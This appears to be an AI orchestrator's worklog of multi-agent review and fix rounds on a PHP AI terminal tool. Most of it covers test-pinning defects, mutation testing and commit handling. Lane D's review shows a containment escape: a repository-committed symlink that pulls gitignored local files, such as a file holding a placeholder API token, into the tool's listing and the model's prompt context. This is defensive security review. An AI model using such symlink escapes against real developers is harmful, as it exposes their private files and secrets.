- Considered and **rejected in-lane**: a shell-side cue for the invisible palette
  (`hostedNotice`/dashboard footer). Both change the chrome line count, hence `paneRows`
  and dashboard geometry — a layout change belonging to #85, not to a review-fix round.

### What the review in flight is briefed to attack

The one-column margin on the cue (35 against a measured floor of 36) across every
spinner frame, percentage string **and locale** — the repo does i18n via `Lang::t()`, a
translated bar is free to be longer, and a hardcoded English constant is a convention
question in its own right. Also: whether `[$app unchanged, null]` can distinguish a
routing change that returns a new-but-equivalent `App`; whether the deliberate
"unstamped ASKs still apply" hole leaves an equivalent stale path open across the
`completeAsync()` fork boundary; and the fact that the cue test reads
`renderStatusBar()` directly rather than the composed frame — documented as a trap for
the next reviewer, but the consequence is that it does not prove the cue reaches the
user-visible frame at all.

---

## Lane D (#13) — round-4 review: 3 findings + 6 nits, no surviving escape

The containment fix **holds**. What round 4 broke was the *claims*, in three places where
the text now says something measurably untrue — plus one residual that is real, larger
than documented, and untested in either direction.

### Finding 1 — the README refutes itself, three lines apart

`README.md:305` (pre-existing): *"a link in a cloned repository's `.claude/skills` may not
leave that skills directory, **so a repo cannot ship a link that reads your files into the
model's prompt context**"*. `README.md:308` (**added by the round-3 fix**): the same idiom
is used by `SkillLoader`, *"where the symlinked-**directory** case is **not** yet closed"*.

Before round 3, `:305` was merely wrong. Now the document contradicts itself, and a reader
who stops at the Skills bullet — the natural place to look for a skills claim — gets the
absolute denial. The fix agent filed the `SkillLoader` half as out-of-lane, which it was;
the *contradiction*, however, is a sentence that change introduced.

**Round 5 resolves this by closing the other half rather than softening the sentence.**
`SkillLoader::contained()` carries the identical escape with a strictly larger payload —
`SKILL.md` bodies enter the model's prompt — and the reviewer's own recommendation was one
shared predicate. Lane D's scope is therefore expanded by `src/Skills/` for this round.
Nothing else owns that tree.

### Finding 2 — the residual is documented as zero and is measurably not

`readableProjectDir()` and `README.md:308` both equate *resolves inside `$projectRoot`* with
*"repository content pointing at repository content, the same trust as a committed
`.yaml`"*. A checkout is not the same set as repository content: it also holds untracked,
gitignored, developer-local files.

A repository committing exactly one line — `.sugar-crush/workflows -> ..` — gets:

```
checkout/kubeconfig.yaml        (developer-local, gitignored)
checkout/local-secrets.yaml     (name: + description: TOKEN=sk-live-DEADBEEF)
checkout/.sugar-crush/workflows -> ..

list():  ["kubeconfig","local-secrets"]
load(local-secrets).description:  TOKEN=sk-live-DEADBEEF
```

`realpath` puts the link **equal** to the anchor, which `containedIn()` accepts via its
`$realPath === $realDir` arm. So `/workflow list` enumerates the basenames of every
`[a-zA-Z0-9_-]+\.yaml` in the developer's checkout regardless of provenance, and any that
parses as a workflow map has its `description` pulled into the listing and the transcript.

Not a regression — pre-fix that directory could point anywhere on the filesystem — but a
modest exfiltration primitive documented as no residual at all. The `$realPath ===
$realDir` arm has no test of its own in either direction. Round 5 is briefed to **reduce**
it (a link resolving to the checkout root is not a repo pointing at its own workflows)
without breaking the in-checkout `-> tools/workflows` layout the round-3 control protects,
and then to document what genuinely remains.

### Finding 3 — the docblock's own rationale for the round-3 edit is false

The duplicate-stage message's new comment claims *"this was the one load-error path that
interpolated a value read out of the file."* Measured over **all 20**
`throw new WorkflowLoadException` sites in `WorkflowRegistry.php` — the complete domain —
**9 still interpolate file content**: `:613` echoes the document's own `name` verbatim,
`:819` a `config:` value, and seven more interpolate `{$where}`, which is built as
`"Workflow file {$yamlPath} stage '{$stageName}'"` — the stage name, verbatim.

So the edit is a local inconsistency, not the policy closure the comment asserts. It is
**not** a security regression: post-fix the project tier is confined to checkout content,
so echoing it leaks nothing the repo does not already know — which is also the honest way
to write the comment. Round 5 must either defend the echo everywhere (and keep or revert
the change on its own merits) or strip all nine, and say which.

The `#0`/`#2` indices themselves are correct: 0-based matches `stage #{$index}` and
`agent #{$agentIndex}`, and nothing in `README.md`, `examples/workflows/` or `workflows/`
numbers stages 1-based (0 grep hits).

### The six nits

1. **The tier-drop is silent and two user-facing messages disagree.** With the directory
   resolving outside the checkout, `loadYaml()`'s `$searched` omits it — while a *dangling*
   link **is** named. `Chat.php:3924` meanwhile hard-codes a message claiming
   `.sugar-crush/workflows/*.yaml` was searched, and `projectWorkflowsPath()` still reports
   it. Nothing tells the user their repo's workflows directory was rejected. The codebase
   already has the pattern: `SkillLoader::recordSkip()` → `Bootstrap::skillSkips()` → one
   line at launch.
2. **"Drops the tier rather than emptying it" is documented three times, pinned zero
   times.** Sabotage making a refused directory vanish from *both* tiers leaves 815 tests
   green. The behaviour is real; it is unmeasured.
3. **The dangling-link allowance is a two-syscall check**, so "nothing is behind it" holds
   per-instant, not across the call — proven structurally (grant, then create the target,
   then `baseNames(confine: true)` returns the entry). The reviewer **could not win the
   race**: 0 disclosures in 40,000 `list()` calls against a child flipping the target.
   Narrow, but the docblock should stop implying snapshot consistency.
4. **`expandPath('/')` returns `''`, and `realpath('')` returns the process CWD** — so
   `--root /` anchors containment at `getcwd()`, not `/`. Fails safe, but the anchor is
   silently the wrong path. Cause is `expandPath()`'s `rtrim($home, '/')`.
5. **A repo's `deploy.yaml` shadows the user's own `deploy.php`**, and only the reverse is
   tested. The project fast path runs before `resolvePhpPath()`. The docblock's "bounded to
   data" is true about the payload and silent about the substitution.
6. **`README.md:377`** counts corroborated stale: 4,337/12,587 against a measured
   6,294/38,324/1 skip.

### What round 4 confirmed, and will not be re-litigated

The anchor is un-forgeable (a repo can move `$projectWorkflowsPath`, never
`$projectRoot`); symlinked checkout roots still work; the tier-drop creates no new
exposure, because the drop is whole-tier and a repo cannot selectively suppress one name;
`list()`/`load()` gates are consistent — **0 divergences over a 19-layout differential
sweep**, both gates sabotage-pinned; `containedIn($projectYaml, dirname($projectYaml))` is
**not** tautological, since `dirname()` is a string op and `realpath()` is not;
`$confineSymlinks === false` is deliberate, user-tier-only and pinned; the signal-stack
drain has **no fifth leak** across every `return`/`throw` in `runFromWorkflow()` plus the
handler closure; the new wiring test bites (exactly 1 failure of 33); all **81**
`new WorkflowRegistry(` call sites are sound, 2 of them in `src/`.

**The `removeDirectory()` teardown fix turned out to be load-bearing, not hygiene** —
reverting it produces 12 warnings across 3 tests and leaves three fixture trees in `/tmp`,
and `failOnWarning="true"` makes that a CI failure.

**The `decide()` reflection test is the right call and the fail-closed branch is an
intentional dormant guard.** `refuses()` collapses everything ≠ `Deny` to `false`, and the
only public route reaches `commitAutoStrikes: true`, so the `Ask`-vs-`Allow` distinction is
unobservable through every public path. Sabotage → exactly 1 failure, that test. It is the
only pin available; the branch stays.

---

## Lane B (#37) — round-14 review: the twelve-round chain is CLOSED

Round 14 built its own oracle — `lexer.go`, `token.go`, `parser.go` copied verbatim out of
the module cache with only the three vhs import lines rewritten (`diff`-proven), plus a
`main` emitting the token stream, command list and `p.Errors()` under `recover()`, all
literals base64-encoded so raw bytes survive JSON — and **transcribed the byte classes from
`lexer.go` before reading the PHP.** They match exactly.

### The verdict on the round-13 rewrite

| corpus (reviewer's own design) | cardinality | clean upstream | MISS | EXTRA | boundary | kind |
|---|---|---|---|---|---|---|
| A: 10 shapes × 255 bytes | 2550 | 764 | **0** | **0** | **0** | **0** |
| B: 13 prefixes × 26 fragments × 4 glues × 5 sentinels | 6760 | 2436 | **0** | **0** | **0** | **0** |
| C: 13 prefixes × 9 bodies × 13 tails × 2 leads (panic) | 3042 | — | FN **0** | FP **0** | **0** | **0** |
| the five shipped tapes | 5 | 5 | **0** | 0 | 0 | 0 |

Corpus B's glue axis deliberately includes **the empty string** — the axis round 12's
delimiter corpus structurally could not produce, and the one that would have caught the
original bug had it existed. All **52** hand-written asserted cases were re-derived from
upstream's own parser: **0 mismatches**, no fiction pinned anywhere.

**The occurrence-direction defect that ran through twelve rounds is closed, on three
independently-designed corpora plus the shipped tapes.** Round 15 is forbidden from
re-opening it.

### Four findings, all in the claims and the test data — none in the model

**F1 — `skipSpeedSuffix()`'s docblock is measurably false.** It claims a suffixed head is
"one upstream rejects outright", so the tolerance "can only ever over-approximate on a tape
that already fails CI". False for every `Set <setting>` head: `parseSet`'s `default:` arm is
`cmd.Args = p.peek.Literal` with **no type gate** (`parser.go:527`), so
`Set Padding @Output x.gif` is **exit 0** upstream (`SET Padding @` + `OUTPUT x.gif`) while
the model answers `''`. So on a tape upstream *accepts*, it under-approximates — the
opposite of the claim. No occurrence is lost, so it is the loud direction; the defect is the
unchecked sentence. It also leaves `directiveValues()`'s completeness statement short: that
says the comment case is "the ONLY divergence class the corpus differential still reports",
and the differential finds **four** — `Set`+comment, `Set`+`@`, unit re-joining, and `Env`'s
Options/Args split.

**F2 — `\r` decides where three tokens end, and the file contains zero CR bytes.** Measured:
the only two `\r` occurrences are the implementation strings themselves. Upstream's
`isNewLine` *and* `isWhitespace` both include `\r`, so CR bounds comments, strings **and**
regexes — the exact axis of all twelve prior findings. Two sabotages survive GREEN: deleting
`|| $char === "\r"` from `scanRegex()`, and narrowing `$newlines` to `"\n"`. The scenario the
first hides: `Set WaitPattern /a<CR> Set Shell "sh"<LF>` parses clean upstream (CR bounds the
regex, then `SET Shell sh`), `validate` exits 0, and the real render aborts
`invalid shell sh` — taking every later tape in the `set -euo pipefail` loop. The unmutated
model is **right**; nothing pins it. Round 13's sweep did include a CRLF family, so the model
was *measured* on CR and never *pinned* on it.

**F3 — one half of round 13's headline change is unpinned.** Dropping the `kind === 'ident'`
gate from `startsDirective()` leaves the suite GREEN; the identical mutation on
`headMatches()` is killed. `Type "abc" "Enter" "def"` is `TYPE '' 'abc Enter def'` upstream
with zero errors; the mutant truncates to `['abc']`.

**F4 — the "sixty-four glue bytes" are 192, and the figure is repeated four times.**
Exhaustive over all 255 bytes in `Set Padding <B>Output x.gif`, classified by upstream's own
parser: **192 glue**, 6 clean-but-head-absorbed (`" # ' / ` {`), 57 rejected. The file's list
is exactly that 192-byte set **restricted to `< 0x80`** — the 128 high bytes are omitted
although each is a one-byte ILLEGAL token, lexically identical to `}`, which *is* in the
list. Confirmed against the binary: `Set Padding \x80Output x.gif` → `validate` exit 0.

**F4 is the third time in this chain that a figure travelled without its domain** — and the
docblock carrying it is the one that names exactly that as round 12's root cause. No
behavioural impact; corpus A shows the model handles all 255 bytes correctly.

### Nits

- **N1** `testTheByteClassesAreUpstreamsOwn()` is a **drift detector, not a derivation** —
  every assertion compares a constant against a hardcoded copy of itself and nothing reads
  `lexer.go` at test time. It does real work (killed 5 mutations) but can only catch a
  *changed* transcription, never a *wrong* one.
- **N2** 44 mutations: 34 killed, **10 survived**, 0 hangs, 0 restore failures — which also
  corroborates round 13's "the 3 HANG mutations are now impossible" claim, since nothing hung
  even with the single-byte, regex, JSON and comment arms deleted. Beyond F2/F3 the survivors
  are equivalent or benign but each needs a verdict: a redundant `!$terminated` conjunct, a
  JSON-text-only change, a `.`-lookahead widening (`Type ..ms`), and dropping `\t` from the
  whitespace class (`Output<TAB>.vhs/cli.gif`).
- **N3** the `40ms` → `40` divergence is inert in the assertions but **live on every shipped
  tape** — `chat.tape:29` and `agents.tape:57` carry `Set TypingSpeed 60ms`, and all five
  carry `Sleep <n>s|ms`. Round 13's "no assertion queries it" is correct; the next person to
  add one gets a failure unrelated to the tape.

### candy-vcr forward-compatibility: verified intact

All three `UPSTREAM-ONLY` labels are additive prose above a live assertion; nothing was
removed. `Tape/Compiler.php:296` records the shell name; `Encode/TapeToGif.php:353-371`
resolves CLI `--shell` → tape directive → default; `Render/FrameStream.php` runs exec mode
under a real PTY with a fallback shell; `Tape/Lexer.php` is a 207-line line-oriented regex
matcher with no JSON and no REGEX token. The byte classes are recorded **portably** for item
#81 — named constants carrying the Go predicate names, plus a grammar write-up explicitly
addressed to whoever writes `candy-vcr/src/Tape/Lexer.php`.

### Also verified, and not to be re-litigated

The UTF-8 re-encoding residual is boundary-neutral **proven rather than argued**: 1280 of
2550 corpus-A cases carry a re-encoded ILLEGAL literal and all 1280 match after folding
`string(byte)` back — the model never consumes upstream literals, so no count or offset can
shift. `SINGLE_BYTE_TOKENS` is never interpolated into a regex (only
`str_contains`/`strlen`), so the `[-%` reversed-range hazard does not exist. The `Home`
citation is correct on all four counts; `VALID_SHELLS`' nine names match `shell.go`; the
panic detector's quoted byte offsets are exact and the binary returns rc=2 on all six panic
rows, rc≤1 on all nine safe ones; the grid tests are non-tautological, with `440` genuinely
uncovered and the docblock saying so.

---

## Lane E (#38) — review: 6 findings + 6 nits, every one a test-domain or claim defect

The reviewed *behaviour* is largely correct. What failed is the pinning and the prose — the
same split lanes B and D landed on in the same round.

### F1 (HIGH) — "answered by a NO-OP" cannot see the effect channel this class actually uses

`assertSame($app, $handled[0])` is object identity, which is strong: a new-but-equivalent
`App` fails it. **The hole is elsewhere.** "No-op" is checked as `[$app identical, null cmd]`
— but `MenuBar::$activeMenu` is process-global static state the shell routes real effects
through, and `handleKeyMsg():144-148` returns `[$app, null]` *after* `MenuBar::openMenu()`.
The class under test already contains a claimed key with a visible effect, an unchanged
`App`, and a null command.

Sabotage: `if ($key === 'r') { MenuBar::openMenu(2); return [$app, null]; }` in
`handleCtrl()`. Ctrl+R in `Pane::Agents` now pops the menu bar open — violating condition 2
exactly as the docblock words it — and the **full suite stays green, 6294/38324**.

### F2 — three fixture Apps are not "all three states"

`createApp(Pane::Agents)` leaves `selectedAgentIndex = -1` and `agentViewMode = List`, so a
guard keyed on `selectedAgentIndex >= 0` survives green. A selected dashboard row is the
*normal* state after one `Down`; the claimed property of the derived set is pinned only for
`List` + no selection.

### F3 — the memo accounting is false in both directions

| keypress | claimed | measured |
|---|---|---|
| ordinary letter, `Enter` | 1 | **0** |
| `ctrl+r` in `Pane::Chat` | 2 | **1** |
| `ctrl+n`/`ctrl+z`, ordinary pane | 2 | 2 |
| `ctrl+r`/`ctrl+w` in `Pane::Agents` | 3 | **2** |

Ordinary typing costs **zero** derivations — PHP short-circuits `!$msg->ctrl ||` at
`KeyboardHandler.php:248` and `$msg->ctrl &&` at `:183`. Exhaustive sweep of **3420**
keypresses (2 menu states × 9 panes × 95 runes × ctrl on/off): **max 2, never 3.**

And three is *structurally impossible*: `shellCtrlRunes()` is read only when
`!shellOwnsKeyboard()`, the yielded set only when `shellOwnsKeyboard()`. **Mutually
exclusive** — the yielded set is asked for on precisely the *complement* of the shell set's
keypresses, which is the **opposite** of the docblock's stated reason for giving it its own
memo ("it is asked for on the same keypresses as the other two"). The timings reproduce
honestly (49.6 µs cold / 0.206 µs warm / `all()` 19.7 µs); it is the reasoning that was
invented.

### F4 — the memo test reads the stored property, not the accessor's return value

`testEveryDerivedSetTheHotPathReadsIsMemoised()` calls the accessors and then asserts on the
`ReflectionProperty`. A mutant that stores correctly and **returns `[]`** stays green.
Fresh-process consequence, measured:

```
press #1 ctrl+r in Pane::Agents: FELL THROUGH TO CHAT -> invisible undrivable picker
press #2 ctrl+r in Pane::Agents: claimed by shell (no-op)
```

Exactly the bug the yield exists to prevent, on the first keystroke only. And **no test
resets either static**, so within one PHPUnit process every later test sees a warm memo and
per-test isolation of the derived sets is impossible. **This is lane D's `PermissionGate`
strike-counter shape, in a different file, found in the same round.**

### F5 — "every pair in this chain is genuinely reachable" is contradicted by lane E's own file

Four links → six pairs; only the two involving the reference are substantiated.
`Chat.php:800-801` says of the other end that the two modals *"cannot both be open"*.
Swapping `renderPalette`/`renderSessionPicker` stays green — the chain's last link is
unreachable **and** unpinned while the comment asserts it is reachable.

### F6 — the generation check has no production producer

Both internal callers build the ASK with `$this->generation` on the same object they then
call, and `mutate()` never touches `'generation'` at either site, so
`$msg->generation !== $this->generation` is **tautologically false at every internal call
site**. `grep 'new PermissionRequestMsg' src/` → exactly those 2 lines; the engine path that
would produce a stale one is explicitly unwired.

Measured three ways against the full suite — replacing the guard body with a `throw`,
deleting the guard, and dropping *every* stamped ASK — each turns exactly **one** test red:
the one that hand-builds the `Msg`. So "the one way this state is reachable through the front
door" has no producer, and the pinning test's domain is structurally incapable of saying so.

**The guard stays** — it is correct dormant defence for the engine path, and the fix is to say
that plainly, exactly as F-A2 did for `shellOwnsKeyboard()`'s unobservable conjunct. The cue
is the real protection, and the review confirms the cue works.

### Nits

- **N-a** the documented priority of `KEY_HELP_TOO_SMALL` over `KEY_HELP_OVER_PROMPT` is
  unpinned; swapping the branches stays green. A 4-column terminal would say "permission
  waiting" instead of "window too small".
- **N-b** the tightened drift regex's *positive* power is unmeasured — reverting it to the
  loose pre-fix form stays green. The "eight spellings the first version missed" claim is
  **true** (all 8 re-run, all caught); nothing asserts it, so the tightening can be silently
  reverted.
- **N-c** "two holes left open on purpose" undercounts. Of 33 near-miss spellings probed
  outside the 57 rows, the misses include the **word forms of the arrow keys** — the class
  `[\x{2190}-\x{2193}]` covers only the glyphs — plus `Spacebar`, `BkSp`, `Ctrl P`,
  `control+p`, `⌘K`, `F-10`, `Numpad 5` and more. `Up`/`Down` matter most: four `*.move` rows
  describe arrow movement, so "Down moves the highlight" is the likeliest next prose
  regression and it escapes today.
- **N-f** `KEY_HELP_OVER_PROMPT` is hardcoded English against the `Lang::t()` rule — but
  `grep -rl 'Lang::t' src/` → **0 PHP files in this lib**. Lib-wide pre-existing deviation,
  recorded rather than fixed; if sugar-crush ever adopts `Lang::t()`, the 35-vs-36 margin
  becomes a translation-time trap.

### Two claims the review confirmed, one of them mine being wrong

- **N-d, the one-column cue margin is genuinely enforced.** Widening the cue 35→46 while
  keeping the substring goes RED with a precise message. Independently measured: cue
  `Width::of` = **35** while `strlen` = 36 — so it was *not* measured with `strlen`, which
  would have sat exactly on the boundary; floor = 2+3+31 = **36**; idle branch 54;
  `contextIndicator()`'s last resort can never be empty so 2 is its floor; `⠴`/`…`/`·` are
  each one column; and there is **no spinner variation** — the string is a literal, not a
  frame.
- **N-e refutes my own attack.** I flagged that the cue test reads `renderStatusBar()` rather
  than the composed frame. It does not:
  `testTheBarAnnouncesAPromptTheReferenceIsCovering()` asserts `'permission waiting'` in the
  **composed frame** at all five sizes, and only the *width comparison* uses the reflection.
  The Veil-backdrop workaround is correctly scoped.

### Also verified

57 rows / 53 live / 4 dormant / 9 contexts; `shellCtrlRunes = [n,k,s,",",g]`,
`chatCtrlRunes = [w,p,o,r,a,c]`, `yielded = [r]`. S1 → exactly 4 red, S2 → exactly 1, S11 →
red. F-A1's central measurement holds end-to-end in all three states, and `handleCtrl('r')`
genuinely has no arm. **The two-condition criterion is complete over all 57 rows**: `p`, `a`
and `c` fail condition 2; `w` and `o` pass 2 but fail 1; only `r` meets both — no third
candidate, and no yielded row that fails either condition. The context-keyed memo is well
pinned (collapsing it turns 9 tests red).

### The pattern across all three lanes this round

Lane B's F4 (a printable-ASCII figure presented as the whole byte space), lane D's Finding 3
(a "the one path that does X" claim with nine live counter-examples), and lane E's F3/F6 (an
invented call-site count and a guard with no producer) are the same defect: **a number or a
claim that travelled without its domain.** All three lanes are now briefed to state the
domain beside every figure in the code itself, not only in the report.

---

## Session-limit interruption — recovery state (all three lanes mid-fix)

All three fix rounds were terminated by an API session limit within minutes of each other.
Nothing was lost: every restore completed before the agents died, so the tree is clean and
usable. Recovery is now **one agent at a time** until the usage window resets.

### Measured tree state at recovery

- **No stray `.bak`/`.orig`/`.sabbak`/`.snap` anywhere** under `sugar-crush/` (excluding
  `vendor/`), and all eleven lane source/test files lint clean. Every sabotage had been
  restored before termination.
- `.vhs/` holds the five tapes + `chat.gif`.
- Full suite: **6321 tests / 45385 assertions / 1 failure / 1 skipped**. The skip is the
  legitimate `MCP/McpClientTest::testLoadConfigReturnsEmptyArrayWhenFileGetContentsFails`.
- Working tree: **20 modified files, 6133 insertions**, plus 12 untracked new files.

### How far each lane got, from the artifacts on disk

**Lane D (round 5)** — the largest scope, and substantially landed. `src/Support/ContainedPath.php`
exists, which means the shared containment predicate was **factored once** rather than copied,
as the round-4 reviewer asked. All four `src/Skills/` files are modified
(`SkillLoader`, `SkillDiscovery`, `ForeignSkillDiscovery`, `SkillManager`) and
`tests/Skills/ProjectSkillsDirContainmentTest.php` is new — so the `SkillLoader` half of
Finding 1 was genuinely closed rather than documented around. `WorkflowRegistry.php` has grown
to +1032 and `WorkflowRegistryTest.php` to +1404. No completion record was written, so what
remains of Findings 2/3 and the six nits is unknown until it reports.

**Lane E** — died immediately after writing *"Now the chain test that pins all six pairs"*, i.e.
inside F5. `tests/Commands/ResetsDerivedRuneSets.php` is new (the F4 static-reset trait, which
is the correct shape for that fix) and `tests/Tui/KeyboardHandlerTest.php` is +536 lines, so
F1/F2/F4 are at least partly done.

**Lane B (round 15)** — died at *"Now the `directiveValues()` divergence enumeration (F1's
second half and N3)"*, so F2/F3/F4 (the `\r` gap, the unpinned `startsDirective()` gate, the
192-byte count) were plausibly reached first. `tests/VhsTapeContractTest.php` is untracked so
its progress does not appear in `git diff --stat`.

### The one red test, and why lane E is being resumed first

`tests/Renderer/KeyHelpTest.php:748` fails:
`'…' [UTF-8](length: 5305) does not contain "session picker" [ASCII](length: 14)`.

It is lane E's own file, from lane E's own unfinished round — no other lane touches it. The
rendered reference box in the failure output *visibly* contains `Ctrl+R  Open the session
picker`, so the needle is likely being split by SGR sequences, or the assertion is running
against a different render than intended. Suggestive detail passed to the agent: the last bar
line in the same output is `keys: ? closes · permission waiting`, so the F-B1 cue branch is
active in that fixture — the reference may be rendering over a pending prompt, which would be
the real cause rather than a string-matching artifact.

Because it owns the only failure, lane E is resumed first; a red suite blocks committing
anything from any lane.

### Two conditions that change while lanes run alone

1. **Concurrent-edit races are gone**, so the reason totals kept moving is gone with them —
   but file ownership still holds exactly as briefed, and each resumed agent is told that the
   other lanes' work is **uncommitted in the tree** and must not be touched, reverted or
   tidied.
2. **Suite totals are usable again.** For the first time this session a full run at 0 failures
   is a real check rather than a moving target. Per-sabotage judgement is still by the targeted
   test file flipping green→red — that rule does not relax.

## Lane E (#38) landed — and the Chat.php hunk split that made it committable

Lane E's fix round came back clean and is committed as **`98bee793`** (11 files,
+4376/-64). Independently verified before committing, not taken on the agent's
word: **6386 tests / 45478 assertions / 0 failures / 1 skipped** in 1m51s, which
matched its self-report exactly. The 1 skip is the legitimate
`MCP/McpClientTest::testLoadConfigReturnsEmptyArrayWhenFileGetContentsFails`.

### Why the commit needed a patch filter

`src/Chat.php` carries hunks from TWO lanes, and lane D's are unfinished. With
`-U0` the file diffs as 14 hunks; at `-U3` they coalesce to 12. The split is
clean at a line boundary:

- **lane E**, 9 hunks, all at new-file line `< 3700`: the `$keyHelp` constructor
  member (`+554`), the F6 permission prose (`+697`), the "cannot both be open"
  arm (`+850`), the generation guard (`+1024`), the wheel-drives-the-reference
  branch (`+2526`), `keyHelp` in the serialised state (`+3251`), and the
  `/keys`-or-`/help` exact-match command (`+3338`).
- **lane D**, 3 hunks, all `>= 3787`: the `#79` synchronous-freeze gap docblock,
  the `isFailure()`/`firstFailure()` failure reporting, and the two-tier
  "no workflows found" message.

So the commit was built by filtering the `-U3` patch on the hunk header's
new-start line and `git apply --cached`ing the result. Two checks before
committing, because a partial-file commit can be syntactically valid and still
reference symbols that only exist in the *other* lane's uncommitted work:
`php -l` on `git show :sugar-crush/src/Chat.php`, and a grep of the staged blob
for `firstFailure|isFailure` — both clean, so the committed intermediate state
stands on its own.

### Authorship: 9 commits reauthored

This is a new server, so `user.name`/`user.email` had never been set and the
whole session's commits were `Test User <test@example.com>`. Set globally to
`Joe Huss <detain@interserver.net>`, then rewrote all 9 unpushed commits.

`git filter-branch` was NOT usable: it refuses to run with a dirty tree, and
this tree holds two lanes' uncommitted work. Instead the chain was rebuilt with
`git commit-tree` — same trees, same messages, same author/committer dates, new
identity — followed by `git update-ref`. That path never touches the working
tree or the index. Verified: new HEAD tree `1af57090` identical to old,
`git diff old new` empty, 9 commits before and after, `%s` list md5-identical,
and `git status --porcelain` byte-identical at 32 entries. New HEAD `98bee793`
(was `b21c362d`).

### What lane E's round is worth remembering

Three defects shared one shape — **process-global state a "this key does
nothing" test cannot see**: `MenuBar::$activeMenu`/`$activeItem`, a
`resetMenuBarState()` that reset one of those two and leaked the other into
every later test in the file, and `KeyBindingRegistry`'s two rune memos letting
a memo test pass against a warm store while the cold path returned something
else. That is now the **third and fourth** instance of the partial-static-reset
shape, after lane D's `PermissionGate` strike counter. Treat it as a known
shape, not a coincidence.

The fix agent's own strongest move was replacing enumeration with discovery:
rather than list the statics it could think of, it walks `src/Tui/` +
`src/Commands/` to find them (7), then cross-checks against what the handler can
actually write. Same instinct on F3, where it re-measured instead of trusting the
brief: max **2** derived rune sets per press over 3420 presses, histogram
1710/938/772, plus a structural argument that 3 is impossible.

It also declined twice to restate a figure it could not reproduce — dropping the
reviewer's "23.8 µs" outright, and replacing a full-suite claim it could not
verify with a bound it could (only 3 test files can construct a
`PermissionRequestMsg`; 252 tests, exactly 1 red per mutation). That is the
behaviour the standing domain rule is meant to produce.

And it caught a bad needle in my own brief: `'session picker'` cannot be the
picker's signature, because the reference screen documents the row *"Open the
session picker"* — so the not-contains assertion fired on the reference's own
text. That was the single red test at recovery; fixed with the picker's controls
line `↑↓ browse`, not by relaxing the assertion.

### All three lanes now running again

Session limit is past, so all three are live in parallel, file-disjoint as
before: lane E's **reviewer** against `98bee793` (read-only, and briefed that
Chat.php's working tree carries lane D hunks below ~3780 that are NOT part of
the commit), lane D **round 5**, lane B **round 15**. Both fix lanes were
briefed to read their own round's findings out of this worklog rather than from
my paraphrase — 2525–2648 for D, 2649–2756 for B, 2757–2897 for the round E
just fixed.

One collision to watch: if the lane E review demands a Chat.php fix, that fix
and lane D's `>= 3780` hunks touch the same file. Serialise those two rather
than running them together.
